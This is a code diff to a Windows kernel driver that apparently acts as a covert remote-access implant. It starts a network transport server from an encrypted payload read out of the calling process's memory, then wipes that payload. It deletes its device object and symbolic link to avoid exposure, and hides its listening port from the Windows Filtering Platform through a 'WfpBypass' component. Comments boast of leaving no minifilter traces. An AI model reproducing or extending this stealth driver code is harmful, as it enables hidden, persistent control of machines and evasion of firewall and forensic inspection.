@@ -27,6 +27,7 @@ static PVOID g_pDriverActualPoolBase = NULL;
  * Bootstrap/Handoff 卸载而释放的宿主 DriverSection。
  */
 PKLDR_DATA_TABLE_ENTRY g_pPersistentModuleListAnchor = NULL;
+static VOID StartBackgroundEngines(PKLDR_DATA_TABLE_ENTRY pModuleListAnchor, MACHENIKE_KERNEL_INTERFACE *UserVar);
 #ifdef IoCompleteRequest
 #undef IoCompleteRequest
 #endif
@@ -408,6 +409,8 @@ static NTSTATUS StartTransportByIo(MACHENIKE_KERNEL_INTERFACE *UserVar, const DR
 // ============================================================
 // 异常上报子系统：已独立抽取至 ExceptionReporter 类 (ExceptionReporter.h / ExceptionReporter.cpp)
 // ============================================================
+static VOID StartBackgroundEngines(PKLDR_DATA_TABLE_ENTRY pModuleListAnchor, MACHENIKE_KERNEL_INTERFACE *UserVar);
+
 NTSTATUS DriverCore::ApplyBootConfigAndStart(MACHENIKE_KERNEL_INTERFACE *UserVar, const DRV_BOOT_CONFIG_EX *pCfgEx,
                                              ULONG callerPid)
 {
@@ -524,13 +527,27 @@ NTSTATUS DriverCore::DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
         NT_SUCCESS(DrvSecurity::ParseTokenFromFileName(&pIrpStack->FileObject->FileName, &CurrentToken)))
     {
         DRV_BOOT_CONFIG_EX cfgEx = {};
-        NTSTATUS anchorSt = DrvSecurity::ScanAndDecryptUserPayload(CurrentToken, &cfgEx);
+        PVOID pMatchedAnchor = NULL;
+        NTSTATUS anchorSt = DrvSecurity::ScanAndDecryptUserPayload(CurrentToken, &cfgEx, &pMatchedAnchor);
         if (NT_SUCCESS(anchorSt))
         {
             DBG("[+] DispatchCreate: Parsed boot config from memory anchor, starting server (Mode=%u Port=%u)",
                 cfgEx.Base.TransportMode, cfgEx.Base.Port);
             NTSTATUS srvSt = DriverCore::ApplyBootConfigAndStart(UserVar, &cfgEx, CurrentProcessId);
-            if (!NT_SUCCESS(srvSt))
+            if (NT_SUCCESS(srvSt))
+            {
+                if (pMatchedAnchor)
+                {
+                    __try
+                    {
+                        RtlSecureZeroMemory(pMatchedAnchor, sizeof(DRV_USER_PAYLOAD_ANCHOR));
+                    }
+                    __except (EXCEPTION_EXECUTE_HANDLER)
+                    {
+                    }
+                }
+            }
+            else
             {
                 DBG("[-] DispatchCreate: NoAuth ApplyBootConfigAndStart failed (0x%08X)", srvSt);
                 status = srvSt;
@@ -539,14 +556,17 @@ NTSTATUS DriverCore::DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
         }
         else
         {
+            status = anchorSt;
             DBG("[-] DispatchCreate: NoAuth ScanAndDecryptUserPayload failed (0x%08X, Token=0x%08X)", anchorSt,
                 CurrentToken);
+
         }
     }
     else if (pIrpStack && pIrpStack->FileObject && pIrpStack->FileObject->FileName.Length > 0)
     {
         DBG("[-] DispatchCreate: NoAuth ParseTokenFromFileName failed for path '%wZ'",
             &pIrpStack->FileObject->FileName);
+        status = STATUS_ACCESS_DENIED;
     }
 #else
     if (!pIrpStack || !pIrpStack->FileObject)
@@ -575,6 +595,7 @@ NTSTATUS DriverCore::DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
             {
                 DBG("[-] DispatchCreate: Dynamic token mismatch for PID=%u, Token=0x%08X", CurrentProcessId,
                     CurrentToken);
+
                 ExceptionReporter::Report("DriverCore::DispatchCreate", STATUS_ACCESS_DENIED, "Dynamic token mismatch");
                 status = STATUS_ACCESS_DENIED;
             }
@@ -583,9 +604,9 @@ NTSTATUS DriverCore::DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
                 status = STATUS_SUCCESS;
                 DRV_BOOT_CONFIG_EX cfgEx = {};
                 BOOLEAN bConfigLoaded = FALSE;
-                // 2. Token 鉴权通过：直接从当前调用进程用户态内存扫描并解密动态锚点载荷 (零文件路径参数，无 MiniFilter
-                // 痕迹，阅后即焚)
-                NTSTATUS anchorSt = DrvSecurity::ScanAndDecryptUserPayload(CurrentToken, &cfgEx);
+                PVOID pMatchedAnchor = NULL;
+                // 2. Token 鉴权通过：直接从当前调用进程用户态内存扫描并解密动态锚点载荷 (待服务启动成功后再阅后即焚清零)
+                NTSTATUS anchorSt = DrvSecurity::ScanAndDecryptUserPayload(CurrentToken, &cfgEx, &pMatchedAnchor);
                 if (NT_SUCCESS(anchorSt))
                 {
                     DBG("[+] DispatchCreate: Successfully scanned and decrypted payload from caller process memory "
@@ -599,13 +620,28 @@ NTSTATUS DriverCore::DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
                 {
                     DBG("[-] DispatchCreate: ScanAndDecryptUserPayload failed (status=0x%08X, Token=0x%08X)", anchorSt,
                         CurrentToken);
+
                     ExceptionReporter::Report("DriverCore::DispatchCreate", anchorSt, "ScanAndDecryptUserPayload failed");
                     status = anchorSt;
+        
                 }
                 if (bConfigLoaded)
                 {
                     NTSTATUS srvSt = DriverCore::ApplyBootConfigAndStart(UserVar, &cfgEx, CurrentProcessId);
-                    if (!NT_SUCCESS(srvSt))
+                    if (NT_SUCCESS(srvSt))
+                    {
+                        if (pMatchedAnchor)
+                        {
+                            __try
+                            {
+                                RtlSecureZeroMemory(pMatchedAnchor, sizeof(DRV_USER_PAYLOAD_ANCHOR));
+                            }
+                            __except (EXCEPTION_EXECUTE_HANDLER)
+                            {
+                            }
+                        }
+                    }
+                    else
                     {
                         DBG("[-] DispatchCreate: ApplyBootConfigAndStart failed (status=0x%08X)", srvSt);
                         status = srvSt;
@@ -619,6 +655,7 @@ NTSTATUS DriverCore::DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
 #endif
     if (NT_SUCCESS(status))
     {
+        StartBackgroundEngines(g_pPersistentModuleListAnchor, UserVar);
         // 握手激活完成：在返回 STATUS_SUCCESS 之前删除符号链接与设备对象，消除内核常驻暴露面
         if (g_SymbolicLinkCreated)
         {
@@ -2397,7 +2434,7 @@ NTSTATUS DriverCore::Initialize(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegi
                 return status;
             }
             TransportManager::Init(UserVar);
-            StartBackgroundEngines(g_pPersistentModuleListAnchor, UserVar);
+
 
             NTSTATUS srvStatus = STATUS_UNSUCCESSFUL;
             MK_SERVER_START_PARAMS srvParams = {};
@@ -2635,6 +2672,7 @@ NTSTATUS DriverCore::Initialize(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegi
                 return srvStatus;
             }
             DBG("[+] Transport server online successfully (Mode=%u)", srvParams.Mode);
+          
             if (srvParams.Mode != MK_SERVER_MODE_USB && srvParams.Mode != MK_SERVER_MODE_RAW_ETH)
             {
                 WfpBypass::SetHiddenLocalPort((USHORT)srvParams.Port);
@@ -2747,21 +2785,12 @@ NTSTATUS DriverCore::Initialize(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegi
             {
                 DBG("[-] Normal Driver Load: MkRpc_Init failed with status 0x%08X", status);
                 ExceptionReporter::Report("DriverEntry_SCM", status, "MkRpc_Init failed");
-                if (g_SymbolicLinkCreated)
-                {
-                    UserVar->Func.IoDeleteSymbolicLink(&g_SymbolicLinkName);
-                    g_SymbolicLinkCreated = FALSE;
-                }
-                if (g_pDeviceObject)
-                {
-                    UserVar->Func.IoDeleteDevice(g_pDeviceObject);
-                    g_pDeviceObject = NULL;
-                }
+       
                 DriverCore::DriverUnload(pDriverObj);
                 return status;
             }
             TransportManager::Init(UserVar);
-            StartBackgroundEngines(g_pPersistentModuleListAnchor, UserVar);
+
 
             DBG("[+] Normal Driver Load: Driver ready and waiting for initial R3 activation (device: %wZ)",
                 &g_DeviceName);
